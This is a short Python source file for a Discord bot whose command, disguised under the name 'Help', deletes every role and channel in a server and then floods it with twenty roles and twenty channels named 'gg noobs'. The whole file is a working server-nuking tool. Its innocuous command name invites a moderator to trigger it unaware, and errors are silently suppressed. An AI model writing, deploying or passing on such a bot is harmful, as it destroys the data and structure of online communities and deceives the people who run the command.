import discord

from discord.ext import commands
bot = commands.Bot(command_prefix='%')

@bot.command()
@commands.has_permissions(manage_roles=True)
async def Help(ctx):

    for m in ctx.guild.roles:
        try:
            await m.delete(reason=".")
        except:
            pass

    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason=".")
        except:
            failed.append(channel.name)
        else:
            counter += 1

    i = 1
    guild = ctx.guild
    try:
       while i <= 20:   
           await guild.create_role(name="gg noobs")
           i = i + 1
    except:
        pass

    a = 1
    guild = ctx.guild
    try:
        while a <= 20:
            await guild.create_text_channel(name="gg noobs")
            a = a + 1
    except:
        pass

bot.run('Token')
